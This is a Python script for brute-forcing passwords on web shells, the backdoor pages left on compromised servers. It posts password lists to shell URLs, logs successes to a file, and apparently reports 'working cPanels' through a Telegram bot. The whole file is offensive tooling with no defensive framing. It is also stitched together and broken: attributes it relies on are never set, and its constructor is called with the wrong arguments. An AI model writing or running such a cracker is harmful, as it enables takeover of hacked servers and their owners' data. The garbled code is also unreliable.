from requests import post as POST
from requests import get as GET
from multiprocessing.dummy import Pool
from queue import Queue
from threading import Thread 


class Cracker:
    def __init__ (self,bot,message_id):
        self.bot = bot
        self.message_id = message_id
    def putValide(self,SHELL,PASSWORD):
        files = open("cracked.txt","a+")
        files.write("SHELL: "+SHELL+"\n")
        files.write("USERNAME: pass\n")
        files.write("PASSWORD: "+PASSWORD + "\n \n")
    def worker(self,SHELL,PASSWORD):
        req = GET(SHELL)
        resp = POST(SHELL, data = {"pass":PASSWORD} )
        if len(req.text)+100< len(resp.text):
            self.putValide(SHELL,PASSWORD)
            print(f'{SHELL}  Password Found ! {PASSWORD}')
            return 0
        return None
    def crackShell(self,SHELL):
        for PASSWORD in self.PASSWORD:
            rp = self.worker(SHELL,PASSWORD)
            if rp is not None:
                break
    def queue_th_config(self,q):
        while not q.empty():
                i=q.get()
                self.checker(i)
                q.task_done()
    def multithreading(self):
        job = Queue()
        for i in self.site:
                job.put(i)
        for i in range(10):
                th=Thread(target=self.queue_th_config,args=(job,))
                th.daemon=True
                th.start()
                th.join()
        try:
                newfile = open(f"output/{self.message_id}[Cpanel].txt","rb")
                content = newfile.read()
                newfile.close()
                self.bot.send_document(self.message_id,content,caption="Working CPanels : ",visible_file_name="cpanels.txt")
                sec = True
        except:
                sec = False
        try:
                ntfile = open(f"output/{self.message_id}notworking[Cpanel].txt","rb")
                content = ntfile.read()
                ntfile.close()
                self.bot.send_document(self.message_id,content,caption="Not Working CPanels : ",visible_file_name="BadCpanels.txt")
                sec = True
        except:
                pass

        if sec is not True:
            self.bot.send_message(self.message_id,"Error Occured")

if __name__ == "__main__":

    print(" SHELL LIST :" ,end= " ")
    list1 = open(input(),"r").read().splitlines()
    print(" PASSWORD LIST :", end = " ")
    list2 = open(input(),"r").read().splitlines()
    print(" Add Pools needed (recommanded  10) :", end = " ")
    pool = Pool(int(input()))
    SHELL = Cracker(list1,list2)
    pool.map(SHELL.crackShell,list1)
